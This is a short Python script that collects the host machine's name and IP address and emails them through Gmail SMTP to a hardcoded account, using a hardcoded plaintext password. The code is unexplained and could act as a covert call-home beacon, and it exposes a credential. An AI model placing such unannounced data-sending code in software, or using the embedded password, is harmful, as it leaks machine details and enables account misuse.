from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import socket

sender_email   = "xboss.developer@gmail.com"
receiver_email = "xboss.developer@gmail.com"
password       = "doneqrmjfhbxlpwv"
hostname       = socket.gethostname()
ip_address     = socket.gethostbyname(hostname)

message            = MIMEMultipart("alternative")
message["Subject"] = ip_address+' '+hostname
message["From"]    = sender_email
message["To"]      = receiver_email
text               = ip_address+' '+hostname
part1              = MIMEText(text, "plain")
message.attach(part1)


with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
    server.login(sender_email, password)
    server.sendmail( sender_email, receiver_email, message.as_string())
    server.quit()

